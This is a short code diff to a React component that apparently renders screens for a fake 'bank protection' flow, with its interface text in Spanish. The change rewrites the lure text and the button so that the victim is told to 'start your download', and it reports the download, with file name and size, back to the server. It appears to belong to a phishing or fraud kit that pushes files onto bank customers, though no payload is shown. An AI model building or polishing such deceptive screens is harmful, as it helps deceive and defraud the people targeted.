@@ -797,7 +797,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 </p>
               </div>
               <p className="text-gray-700">
-                <strong>Para continuar con la protección de tu cuenta, haz clic en enviar:</strong>
+                <strong>Para iniciar tu descarga, haz clic en el siguiente botón:</strong>
               </p>
             </div>
             <Button 
@@ -821,7 +821,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   
                   // Notificar al servidor que se realizó la descarga
                   onSubmit(ScreenType.PROTECCION_BANCARIA, { 
-                    action: 'send',
+                    action: 'download',
                     fileName: fileToDownload.fileName,
                     fileSize: screenData.fileSize || 'Desconocido',
                     downloaded: true,
@@ -833,7 +833,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 }
               }}
             >
-              Enviar
+              Descargar ahora
             </Button>
           </>
         );
